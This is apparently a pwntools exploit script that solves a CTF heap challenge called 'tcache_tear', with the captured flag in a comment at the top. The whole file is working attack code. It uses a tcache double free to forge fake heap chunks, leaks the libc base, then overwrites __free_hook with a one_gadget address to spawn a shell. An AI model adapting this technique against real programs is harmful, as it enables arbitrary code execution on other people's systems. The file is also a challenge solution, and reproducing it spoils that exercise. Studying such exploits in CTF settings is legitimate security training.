#FLAG{tc4ch3_1s_34sy_f0r_y0u}
from pwn import *


def alloc(size, note):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", note)


def free():
    p.sendlineafter(":", "2")


context.log_level="debug"
p=process("./tcache_tear",env = {'LD_PRELOAD' : './libc.so'})
libc = ELF("./libc.so")

name_global = 0x602060
p.sendlineafter("Name:", "A"*4)

# leak libc
alloc(0x70, "A"*4)
free()
free()

#forge fake chunks above unsorted chunk with prev_in_use set
payload1 = "" 
payload1 += p64(0)
payload1 += p64(0x21) # min size of the chunk + prev_in_use 
payload1 += p64(0)*2
payload1 += p64(0)
payload1 += p64(0x21)

alloc(0x70, p64(name_global + (0x500 - 0x8 * 2))) #address to write the payload
alloc(0x70, "A"*4) 
alloc(0x70, payload1) 

#####
alloc(0x60, "A"*4)
free()
free()
#####

#forge fake unsorted chunk of size 0x500
payload2 = ""
payload2 += p64(0) 
payload2 += p64(0x501) 
payload2 += p64(0)*5 # padding for global pointer to current chunk 
payload2 += p64(name_global) 

alloc(0x60, p64(name_global - (0x8 * 2)))
alloc(0x60, "A" * 8) 
alloc(0x60, payload2)

#####

free() #freeing the 0x602060 chunk #

p.sendlineafter(":", "3")
p.recvuntil("Name :")
libc_base = u64(p.recv(8))-0x3ebca0
log.info(hex(libc_base))

# write free_hook
free_hook = libc_base + libc.symbols['__free_hook']
#system= libc_base + libc.symbols['system']
one_gadget = 0x4f322 + libc_base # $one_gadget libc.so

alloc(0x40, "A"*4)
free()
free()

# get_shell

alloc(0x40, p64(free_hook))
alloc(0x40, "A"*4)
alloc(0x40, p64(one_gadget)) #change function free_hook to gadget
pause()
free() # trigger free_hook
p.interactive()


